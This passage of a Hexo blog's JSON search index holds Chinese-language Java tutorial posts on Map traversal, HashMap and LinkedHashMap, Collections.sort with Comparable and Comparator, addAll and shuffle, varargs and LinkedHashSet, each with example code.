entrySet(): 获取到Map集合中所有的键值对对象的集合(Set集合)。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合遍历键找值方式","slug":"java00185Map集合遍历键找值方式","date":"2020-04-04T15:47:55.000Z","updated":"2020-04-04T15:52:24.366Z","comments":true,"path":"2020/04/04/java00185Map集合遍历键找值方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00185Map集合遍历键找值方式/","excerpt":"","text":"Map集合遍历键找值方式 键找值方式：即通过元素中的键，获取键所对应的值 分析步骤： 获取Map中所有的键，由于键是唯一的，所以返回一个Set集合存储所有的键。方法提示:keyset() 遍历键的Set集合，得到每一个键。 根据键，获取键所对应的值。方法提示:get(K key) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;/* Map集合的第一种遍历方式:通过键找值的方式 Map集合中的方法: Set&lt;K&gt; keySet() 返回此映射中包含的键的 Set 视图。 实现步骤: 1.使用Map集合中的方法keySet(),把Map集合所有的key取出来,存储到一个Set集合中 2.遍历set集合,获取Map集合中的每一个key 3.通过Map集合中的方法get(key),通过key找到value */ public class Demo02KeySet &#123; public static void main(String[] args) &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); //1.使用Map集合中的方法keySet(),把Map集合所有的key取出来,存储到一个Set集合中 Set&lt;String&gt; set = map.keySet(); //2.遍历set集合,获取Map集合中的每一个key //使用迭代器遍历Set集合 Iterator&lt;String&gt; it = set.iterator(); while (it.hasNext())&#123; String key = it.next(); //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-------------------\"); //使用增强for遍历Set集合 for(String key : set)&#123; //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-------------------\"); //使用增强for遍历Set集合 for(String key : map.keySet())&#123; //3.通过Map集合中的方法get(key),通过key找到value Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map接口中的常用方法","slug":"java00184Map接口中的常用方法","date":"2020-04-04T15:23:04.000Z","updated":"2020-04-04T15:36:11.822Z","comments":true,"path":"2020/04/04/java00184Map接口中的常用方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00184Map接口中的常用方法/","excerpt":"","text":"Map接口中的常用方法 Map接口中定义了很多方法，常用的如下： public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 public V remove(Object key): 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。 public V get(Object key) 根据指定的键，在Map集合中获取对应的值。 boolean containsKey(Object key) 判断集合中是否包含指定的键。 public Set&lt;K&gt; keySet(): 获取Map集合中所有的键，存储到Set集合中。 public Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet(): 获取到Map集合中所有的键值对对象的集合(Set集合)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Map;public class Demo01Map &#123; public static void main(String[] args) &#123; show04(); &#125; /* boolean containsKey(Object key) 判断集合中是否包含指定的键。 包含返回true,不包含返回false */ private static void show04() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); boolean b1 = map.containsKey(\"赵丽颖\"); System.out.println(\"b1:\"+b1);//b1:true boolean b2 = map.containsKey(\"赵颖\"); System.out.println(\"b2:\"+b2);//b2:false &#125; /* public V get(Object key) 根据指定的键，在Map集合中获取对应的值。 返回值: key存在,返回对应的value值 key不存在,返回null */ private static void show03() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); Integer v1 = map.get(\"杨颖\"); System.out.println(\"v1:\"+v1);//v1:165 Integer v2 = map.get(\"迪丽热巴\"); System.out.println(\"v2:\"+v2);//v2:null &#125; /* public V remove(Object key): 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。 返回值:V key存在,v返回被删除的值 key不存在,v返回null */ private static void show02() &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); System.out.println(map);//&#123;林志玲=178, 赵丽颖=168, 杨颖=165&#125; Integer v1 = map.remove(\"林志玲\"); System.out.println(\"v1:\"+v1);//v1:178 System.out.println(map);//&#123;赵丽颖=168, 杨颖=165&#125; //int v2 = map.remove(\"林志颖\");//自动拆箱 NullPointerException Integer v2 = map.remove(\"林志颖\"); System.out.println(\"v2:\"+v2);//v2:null System.out.println(map);//&#123;赵丽颖=168, 杨颖=165&#125; &#125; /* public V put(K key, V value): 把指定的键与指定的值添加到Map集合中。 返回值:v 存储键值对的时候,key不重复,返回值V是null 存储键值对的时候,key重复,会使用新的value替换map中重复的value,返回被替换的value值 */ private static void show01() &#123; //创建Map集合对象,多态 Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); String v1 = map.put(\"李晨\", \"范冰冰1\"); System.out.println(\"v1:\"+v1);//v1:null String v2 = map.put(\"李晨\", \"范冰冰2\"); System.out.println(\"v2:\"+v2);//v2:范冰冰1 System.out.println(map);//&#123;李晨=范冰冰2&#125; map.put(\"冷锋\",\"龙小云\"); map.put(\"杨过\",\"小龙女\"); map.put(\"尹志平\",\"小龙女\"); System.out.println(map);//&#123;杨过=小龙女, 尹志平=小龙女, 李晨=范冰冰2, 冷锋=龙小云&#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map常用子类","slug":"java00183Map常用子类","date":"2020-04-04T15:17:33.000Z","updated":"2020-04-04T15:26:20.035Z","comments":true,"path":"2020/04/04/java00183Map常用子类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00183Map常用子类/","excerpt":"","text":"Map常用子类 通过查看Map接口描述，看到Map有多个子类，这里我们主要讲解常用的HashMap集合、LinkedHashMap集合。 HashMap&lt;K,V&gt;：存储数据采用的哈希表结构，元素的存取顺序不能保证一致。由于要保证键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 LinkedHashMap&lt;K,V&gt;：HashMap下有个子类LinkedHashMap，存储数据采用的哈希表结构+链表结构。通过链表结构可以保证元素的存取顺序一致；通过哈希表结构可以保证的键的唯一、不重复，需要重写键的hashCode()方法、equals()方法。 tips：Map接口中的集合都有两个泛型变量&lt;K,V&gt;,在使用时，要为两个泛型变量赋予数据类型。两个泛型变量&lt;K,V&gt;的数据类型可以相同，也可以不同。 java.util.HashMap&lt;k,v&gt;集合 implements Map&lt;k,v&gt;接口 ​ HashMap集合的特点: ​ 1.HashMap集合底层是哈希表:查询的速度特别的快 ​ JDK1.8之前:数组+单向链表 ​ JDK1.8之后:数组+单向链表|红黑树(链表的长度超过8):提高查询的速度 ​ 2.hashMap集合是一个无序的集合,存储元素和取出元素的顺序有可能不一致 java.util.LinkedHashMap&lt;k,v&gt;集合extends HashMap&lt;k,v&gt;集合 LinkedHashMap的特点: ​ 1.LinkedHashMap集合底层是哈希表+链表(保证迭代的顺序) ​ 2.LinkedHashMap集合是一个有序的集合,存储元素和取出元素的顺序是一致的","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合概述","slug":"java00182Map集合概述","date":"2020-04-04T15:10:45.000Z","updated":"2020-04-04T15:15:55.378Z","comments":true,"path":"2020/04/04/java00182Map集合概述/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/04/java00182Map集合概述/","excerpt":"","text":"Map集合概述 现实生活中，我们常会看到这样的一种集合：IP地址与主机名，身份证号与个人，系统用户名与系统用户对象等，这种一一对应的关系，就叫做映射。Java提供了专门的集合类用来存放这种对象关系的对象，即java.util.Map接口。 我们通过查看Map接口描述，发现Map接口下的集合与Collection接口下的集合，它们存储数据的形式不同，如下图。 Collection中的集合，元素是孤立存在的（理解为单身），向集合中存储元素采用一个个元素的方式存储。 Map中的集合，元素是成对存在的(理解为夫妻)。每个元素由键与值两部分组成，通过键可以找对所对应的值。 Collection中的集合称为单列集合，Map中的集合称为双列集合。 需要注意的是，Map中的集合不能包含重复的键，值可以重复；每个键只能对应一个值。 java.util.Map&lt;k,v&gt;集合 Map集合的特点: 1.Map集合是一个双列集合,一个元素包含两个值(一个key,一个value) 2.Map集合中的元素,key和value的数据类型可以相同,也可以不同 3.Map集合中的元素,key是不允许重复的,value是可以重a复的 4.Map集合中的元素,key和value是一一对应","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java_Collection集合总结","slug":"java00181总结001","date":"2020-04-02T19:21:09.000Z","updated":"2020-04-03T15:58:27.788Z","comments":true,"path":"2020/04/03/java00181总结001/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/03/java00181总结001/","excerpt":"","text":"list集合排序 Collections.sort(List&lt;T&gt; list) 要重写Comparable接口中的compareTo方法 Collections.sort(List&lt;T&gt; list，Comparator&lt;? super T&gt;) 要从写Comparator类中的compare方法 使用匿名内部类重写 往集合添加元素 Collections.addAll(Collection&lt;T&gt; c, T... elements) 打乱集合顺序 Collections.shuffle(List&lt;?&gt; list) 集合： 1.集合是java中提供的一种容器，可以用来存储多个数据。 2.长度是可变的. 3.存储的元素是对象 集合框架介绍 存储结构可以分为两大类 1.单列集合java.util.Collection 2.双列集合java.util.Map Collection是单列集合类的根接口 Collection有两个子接口: java.util.List java.util.Set List的特点是元素有序、元素可重复 . Set的特点是元素无序，而且不可重复。 List接口的主要实现类有 1.java.util.ArrayList 2.java.util.LinkedList Set接口的主要实现类有 1.java.util.HashSet 2.java.util.TreeSet 单列集合共性的方法 public boolean add(E e)：把给定的对象添加到当前集合中 。 public void clear() :清空集合中所有的元素。 public boolean remove(E e): 把给定的对象在当前集合中删除。 public boolean contains(E e): 判断当前集合中是否包含给定的对象。 public boolean isEmpty(): 判断当前集合是否为空。 public int size(): 返回集合中元素的个数。 public Object[] toArray(): 把集合中的元素，存储到数组中。 Iterator接口 迭代器(对集合进行遍历) 迭代器的使用步骤(重点): 1.使用集合中的方法iterator()获取迭代器的实现类对象,使用Iterator接口接收(多态) Iterator&lt;类名&gt; it = 集合对象.iterator(); 2.使用Iterator接口中的方法hasNext判断还有没有下一个元素 12while(it.hasNext())&#123;&#125; 3.使用Iterator接口中的方法next取出集合中的下一个元素 1类名 o = it.next(); 增强for循环 底层使用的也是迭代器 JDK1.5之后出现的新特性 所有的单列集合都可以使用增强for public interface Iterable&lt;T&gt;实现这个接口允许对象成为 “foreach” 语句的目标 123for(集合/数组的数据类型 变量名: 集合名/数组名)&#123;sout(变量名);&#125; 泛型的概念 泛型是一种未知类型,当不确定使用什么类型的时候,可以使用泛型 定义和使用含有泛型的类 123修饰符 class 类名&lt;代表泛型的变量&gt;&#123; &#125; 定义和使用含有泛型的方法 泛型定义在方法的修饰符和返回值类型之间 含有泛型的方法,在调用方法的时候确定泛型的数据类型 传递什么类型的参数,泛型就是什么类型 123修饰符 &lt;泛型&gt; 返回值类型 方法名(参数列表(使用泛型))&#123;方法体;&#125; 定义和使用含有泛型的接口 12修饰符 interface 接口名&lt;代表泛型的变量&gt; &#123; &#125; 使用有两种方法 1.在实现类中指定泛型接口类型 12public class A implements 接口名&lt;String&gt;&#123;&#125; 2.接口使用什么泛型,类就使用什么泛型 12修饰符 interface 接口名&lt;T&gt; &#123; &#125; 12public class A&lt;T&gt; implements 接口名&lt;T&gt;&#123;&#125; 泛型通配符 使用泛型类或者接口时，传递的数据中，泛型类型不确定，可以通过通配符&lt;?&gt;表示 . 使用泛型的通配符后，只能使用Object类中的共性方法，集合中元素自身方法无法使用。 ?:代表任意的数据类型 不能创建对象使用 只能作为方法的参数使用 泛型的上限： 格式：类型名称 对象名称 意义： 只能接收该类型及其子类 泛型的下限： 格式： 类型名称 对象名称 意义： 只能接收该类型及其父类型 12public static void printArray(ArrayList&lt;?&gt; list)&#123;&#125; 12345// 泛型的上限：此时的泛型?，必须是Number类型或者Number类型的子类public static void getElement1(Collection&lt;? extends Number&gt; coll)&#123;&#125;// 泛型的下限：此时的泛型?，必须是Number类型或者Number类型的父类public static void getElement2(Collection&lt;? super Number&gt; coll)&#123;&#125; 数据结构 链表 查询慢,增删快. 数组 查询快,增删慢. 队列 先进先出 栈 先进后出 红黑树 节点可以是红色的或者黑色的 根节点是黑色的 叶子节点(空节点)是黑色的 每个红色节点的字节点都是黑色的 任何一个节点到每一个叶子节点的所有路径上黑色节点相同 List集合常用方法 public void add(int index, E element): 将指定的元素，添加到该集合中的指定位置上。 public E get(int index):返回集合中指定位置的元素。 public E remove(int index): 移除列表中指定位置的元素, 返回的是被移除的元素。 public E set(int index, E element):用指定元素替换集合中指定位置的元素,返回值的更新前的元素。 索引越界异常 IndexOutOfBoundsException:索引越界异常,集合会报 ArrayIndexOutOfBoundsException:数组索引越界异常 StringIndexOutOfBoundsException:字符串索引越界异常 ArrayList集合 使用的是数组结构,查询快,增删慢 LinkedList集合 数据存储的结构是链表结构 ( 双向链表 ) 方便元素添加、删除的集合 public void addFirst(E e):将指定元素插入此列表的开头。 public void addLast(E e):将指定元素添加到此列表的结尾。 public E getFirst():返回此列表的第一个元素。 public E getLast():返回此列表的最后一个元素。 public E removeFirst():移除并返回此列表的第一个元素。 public E removeLast():移除并返回此列表的最后一个元素。 public E pop():从此列表所表示的堆栈处弹出一个元素。 public void push(E e):将元素推入此列表所表示的堆栈。 public boolean isEmpty()：如果列表不包含元素，则返回true。 public E remove(int index) 移除此列表中指定位置处的元素。将任何后续元素向左移（从索引中减 1）。返回从列表中删除的元素。 HashSet集合 是Set接口的一个实现类 存储的元素是不可重复的 元素都是无序的 底层的实现其实是一个java.util.HashMap支持 根据对象的哈希值来确定元素在集合中的存储位置 保证元素唯一性的方式依赖于：hashCode与equals方法 哈希值 JDK1.8之前，哈希表底层采用数组+链表实现的 JDK1.8 以后, 哈希表存储采用数组+链表+红黑树实现 ,当链表长度超过阈值（8）时，将链表转换为红黑树 自定义的类需要重写 hashCode和equals方法 保证对象其唯一 Set集合存储元素不重复的原理 set集合在调用add时会调用hashCode()和equals()判断元素是否重复 hashCode()会生成一个哈希值并存储在数组里 如果哈希值相同,称为哈希冲突,会在哈希值对应的链表或红黑树中查看元素是否相同,如果相同则抛弃 HashSet存储自定义类型元素 HashSet存储自定义类型元素 set集合报错元素唯一: 存储的元素(String,Integer,…Student,Person…),必须重写hashCode方法和equals方法 123456789101112131415161718192021public class Person &#123; private int age; private String name; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; //下面是比较元素 return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125;&#125; LinkedHashSet集合 java.util.LinkedHashSet集合 extends HashSet集合 LinkedHashSet集合特点: 底层是一个哈希表(数组+链表/红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序 LinkedHashSet&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); 可变参数 ​ 可变参数底层就是一个数组 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 123修饰符 返回值类型 方法名(数据类型...变量名)&#123; &#125; Collections集合工具类的方法addAll和shuffle java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 public static void shuffle(List&lt;?&gt; list)打乱顺序:打乱集合顺序。 12Collections.addAll(list,\"a\",\"b\",\"c\",\"d\",\"e\");Collections.shuffle(list); Collections集合工具类的方法sort(List) 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） public static&lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序 sort(List&lt;T&gt; list)使用前提 被排序的集合里边存储的元素,必须实现Comparable,重写接口中的方法compareTo定义排序的规则 1Collections.sort(list01);//默认是升序 12345678910111213141516public class Person implements Comparable&lt;Person&gt;&#123; private int age; public int getAge() &#123; return age; &#125; //重写排序的规则 @Override public int compareTo(Person o) &#123; //return 0;//认为元素都是相同的 //自定义比较的规则,比较两个人的年龄(this,参数Person) //return this.getAge() - o.getAge();//年龄升序排序 //年龄降序排序公式: -(o.getAge() - this.getAge()) return o.getAge() - this.getAge();//年龄升序排序 &#125;&#125; Collections集合工具类的方法sort(List,Comparator) java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; ):将集合中元素按照指定规则排序。 Comparator:相当于找一个第三方的裁判,比较两个 Comparator的排序规则: o1-o2:升序 o2 - o1 降序 12345678Collections.sort(list01, new Comparator&lt;Integer&gt;() &#123; //重写比较的规则 @Override public int compare(Integer o1, Integer o2) &#123; //return o1-o2;//升序 return o2-o1;//降序 &#125;&#125;); 123456789101112//扩展:了解Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 int result = o1.getAge()-o2.getAge(); //如果两个人年龄相同,再使用姓名的第一个字比较 if(result==0)&#123; result = o1.getName().charAt(0)-o2.getName().charAt(0); &#125; return result; &#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[{"name":"Java总结","slug":"Java总结","permalink":"https://xiaowuyoucy.github.io/tags/Java总结/"}]},{"title":"java_Collections集合工具类的方法_sort(List,Comparator)","slug":"java00180-Collections集合工具类的方法-sort-List-Comparator","date":"2020-03-21T18:04:59.000Z","updated":"2020-03-21T18:10:50.461Z","comments":true,"path":"2020/03/22/java00180-Collections集合工具类的方法-sort-List-Comparator/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00180-Collections集合工具类的方法-sort-List-Comparator/","excerpt":"","text":"Collections集合工具类的方法_sort(List,Comparator) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;import java.util.Comparator;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; ):将集合中元素按照指定规则排序。 Comparator和Comparable的区别 Comparable:自己(this)和别人(参数)比较,自己需要实现Comparable接口,重写比较的规则compareTo方法 Comparator:相当于找一个第三方的裁判,比较两个 Comparator的排序规则: o1-o2:升序 */public class Demo03Sort &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(3); list01.add(2); System.out.println(list01);//[1, 3, 2] Collections.sort(list01, new Comparator&lt;Integer&gt;() &#123; //重写比较的规则 @Override public int compare(Integer o1, Integer o2) &#123; //return o1-o2;//升序 return o2-o1;//降序 &#125; &#125;); System.out.println(list01); ArrayList&lt;Student&gt; list02 = new ArrayList&lt;&gt;(); list02.add(new Student(\"a迪丽热巴\",18)); list02.add(new Student(\"古力娜扎\",20)); list02.add(new Student(\"杨幂\",17)); list02.add(new Student(\"b杨幂\",18)); System.out.println(list02); /*Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 return o1.getAge()-o2.getAge(); &#125; &#125;);*/ //扩展:了解 Collections.sort(list02, new Comparator&lt;Student&gt;() &#123; @Override public int compare(Student o1, Student o2) &#123; //按照年龄升序排序 int result = o1.getAge()-o2.getAge(); //如果两个人年龄相同,再使用姓名的第一个字比较 if(result==0)&#123; result = o1.getName().charAt(0)-o2.getName().charAt(0); &#125; return result; &#125; &#125;); System.out.println(list02); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.itheima.demo05.Collections;public class Student &#123; private String name; private int age; public Student() &#123; &#125; public Student(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return \"Student&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Collections集合工具类的方法_sort(List)","slug":"java00179-Collections集合工具类的方法-sort（List）","date":"2020-03-21T17:53:06.000Z","updated":"2020-03-21T18:03:47.641Z","comments":true,"path":"2020/03/22/java00179-Collections集合工具类的方法-sort（List）/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00179-Collections集合工具类的方法-sort（List）/","excerpt":"","text":"Collections集合工具类的方法_sort(List) 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： public static &lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序。 注意: sort(List&lt;T&gt; list)使用前提 被排序的集合里边存储的元素,必须实现Comparable,重写接口中的方法compareTo定义排序的规则 Comparable接口的排序规则: 自己(this)-参数:升序 两个对象比较的结果有三种：大于，等于，小于。 如果要按照升序排序， 则o1 小于o2，返回（负数），相等返回0，01大于02返回（正数） 如果要按照降序排序 则o1 小于o2，返回（正数），相等返回0，01大于02返回（负数） */public class Demo02Sort &#123; public static void main(String[] args) &#123; ArrayList&lt;Integer&gt; list01 = new ArrayList&lt;&gt;(); list01.add(1); list01.add(3); list01.add(2); System.out.println(list01);//[1, 3, 2] //public static &lt;T&gt; void sort(List&lt;T&gt; list):将集合中元素按照默认规则排序。 Collections.sort(list01);//默认是升序 System.out.println(list01);//[1, 2, 3] ArrayList&lt;String&gt; list02 = new ArrayList&lt;&gt;(); list02.add(\"a\"); list02.add(\"c\"); list02.add(\"b\"); System.out.println(list02);//[a, c, b] Collections.sort(list02); System.out.println(list02);//[a, b, c] ArrayList&lt;Person&gt; list03 = new ArrayList&lt;&gt;(); list03.add(new Person(\"张三\",18)); list03.add(new Person(\"李四\",20)); list03.add(new Person(\"王五\",15)); System.out.println(list03);//[Person&#123;name='张三', age=18&#125;, Person&#123;name='李四', age=20&#125;, Person&#123;name='王五', age=15&#125;] Collections.sort(list03); System.out.println(list03); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.itheima.demo05.Collections;public class Person implements Comparable&lt;Person&gt;&#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; //重写排序的规则 @Override public int compareTo(Person o) &#123; //return 0;//认为元素都是相同的 //自定义比较的规则,比较两个人的年龄(this,参数Person) //return this.getAge() - o.getAge();//年龄升序排序 return o.getAge() - this.getAge();//年龄升序排序 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_Collections集合工具类的方法_addAll和shuffle","slug":"java00178-Collections集合工具类的方法-addAll和shuffle","date":"2020-03-21T17:49:27.000Z","updated":"2020-03-21T17:50:17.605Z","comments":true,"path":"2020/03/22/java00178-Collections集合工具类的方法-addAll和shuffle/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00178-Collections集合工具类的方法-addAll和shuffle/","excerpt":"","text":"Collections集合工具类的方法_addAll和shuffle 123456789101112131415161718192021222324252627282930package com.itheima.demo05.Collections;import java.util.ArrayList;import java.util.Collections;/* - java.utils.Collections是集合工具类，用来对集合进行操作。部分方法如下： - public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 - public static void shuffle(List&lt;?&gt; list) 打乱顺序:打乱集合顺序。 */public class Demo01Collections &#123; public static void main(String[] args) &#123; ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); //往集合中添加多个元素 /*list.add(\"a\"); list.add(\"b\"); list.add(\"c\"); list.add(\"d\"); list.add(\"e\");*/ //public static &lt;T&gt; boolean addAll(Collection&lt;T&gt; c, T... elements):往集合中添加一些元素。 Collections.addAll(list,\"a\",\"b\",\"c\",\"d\",\"e\"); System.out.println(list);//[a, b, c, d, e] //public static void shuffle(List&lt;?&gt; list) 打乱顺序:打乱集合顺序。 Collections.shuffle(list); System.out.println(list);//[b, d, c, a, e], [b, d, c, a, e] &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_可变参数","slug":"java00177-可变参数","date":"2020-03-21T17:41:38.000Z","updated":"2020-03-21T17:46:02.048Z","comments":true,"path":"2020/03/22/java00177-可变参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00177-可变参数/","excerpt":"","text":"可变参数: 是JDK1.5之后出现的新特性 使用前提: ​ 当方法的参数列表数据类型已经确定,但是参数的个数不确定,就可以使用可变参数. 使用格式: 定义方法时使用 123修饰符 返回值类型 方法名(数据类型...变量名)&#123; &#125; 可变参数的原理: ​ 可变参数底层就是一个数组,根据传递参数个数不同,会创建不同长度的数组,来存储这些参数 ​ 传递的参数个数,可以是0个(不传递),1,2…多个 可变参数的注意事项 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263package com.itheima.demo04.VarArgs;public class Demo01VarArgs &#123; public static void main(String[] args) &#123; //int i = add(); //int i = add(10); int i = add(10,20); //int i = add(10,20,30,40,50,60,70,80,90,100); System.out.println(i); method(\"abc\",5.5,10,1,2,3,4); &#125; /* 可变参数的注意事项 1.一个方法的参数列表,只能有一个可变参数 2.如果方法的参数有多个,那么可变参数必须写在参数列表的末尾 */ /*public static void method(int...a,String...b)&#123; &#125;*/ /*public static void method(String b,double c,int d,int...a)&#123; &#125;*/ //可变参数的特殊(终极)写法 public static void method(Object...obj)&#123; &#125; /* 定义计算(0-n)整数和的方法 已知:计算整数的和,数据类型已经确定int 但是参数的个数不确定,不知道要计算几个整数的和,就可以使用可变参数 add(); 就会创建一个长度为0的数组, new int[0] add(10); 就会创建一个长度为1的数组,存储传递来过的参数 new int[]&#123;10&#125;; add(10,20); 就会创建一个长度为2的数组,存储传递来过的参数 new int[]&#123;10,20&#125;; add(10,20,30,40,50,60,70,80,90,100); 就会创建一个长度为10的数组,存储传递来过的参数 new int[]&#123;10,20,30,40,50,60,70,80,90,100&#125;; */ public static int add(int...arr)&#123; //System.out.println(arr);//[I@2ac1fdc4 底层是一个数组 //System.out.println(arr.length);//0,1,2,10 //定义一个初始化的变量,记录累加求和 int sum = 0; //遍历数组,获取数组中的每一个元素 for (int i : arr) &#123; //累加求和 sum += i; &#125; //把求和结果返回 return sum; &#125; //定义一个方法,计算三个int类型整数的和 /*public static int add(int a,int b,int c)&#123; return a+b+c; &#125;*/ //定义一个方法,计算两个int类型整数的和 /*public static int add(int a,int b)&#123; return a+b; &#125;*/&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java_LinkedHashSet集合","slug":"java00176-LinkedHashSet集合","date":"2020-03-21T17:39:08.000Z","updated":"2020-03-21T17:40:21.083Z","comments":true,"path":"2020/03/22/java00176-LinkedHashSet集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/22/java00176-LinkedHashSet集合/","excerpt":"","text":"LinkedHashSet集合 123456789101112131415161718192021222324252627package com.itheima.demo02.Set;import java.util.HashSet;import java.util.LinkedHashSet;/* java.util.LinkedHashSet集合 extends HashSet集合 LinkedHashSet集合特点: 底层是一个哈希表(数组+链表/红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序 */public class Demo04LinkedHashSet &#123; public static void main(String[] args) &#123; HashSet&lt;String&gt; set = new HashSet&lt;&gt;(); set.add(\"www\"); set.add(\"abc\"); set.add(\"abc\"); set.add(\"itcast\"); System.out.println(set);//[abc, www, itcast] 无序,不允许重复 LinkedHashSet&lt;String&gt; linked = new LinkedHashSet&lt;&gt;(); linked.add(\"www\"); linked.add(\"abc\"); linked.add(\"abc\"); linked.add(\"itcast\"); System.out.println(linked);//[www, abc, itcast] 有序,不允许重复 